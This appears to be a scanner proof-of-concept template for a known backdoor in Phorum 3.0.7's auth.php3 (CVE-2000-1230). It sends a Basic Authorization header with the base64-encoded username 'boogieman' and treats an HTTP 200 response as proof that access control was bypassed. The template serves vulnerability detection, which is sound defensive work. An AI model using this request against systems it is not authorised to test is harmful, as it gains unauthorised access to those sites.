[info]
author = "ave"
description = "验证 Phorum 3.0.7 auth.php3 后门漏洞，通过发送带有 PHP_AUTH_USER=boogieman 认证头的 HTTP 请求绕过访问控制，若返回 200 则表明存在后门"
id = "POC-AVE-2000-0849"
name = "Phorum 3.0.7 auth.php3 Backdoor Access PoC"
severity = "medium"
tags = ["ave-2000-0849"]
vuln_id = [
    "CVE-2000-1230",
    "AVE-2000-0849",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/auth.php3"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic Ym9vZ2llbWFuOg=="

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
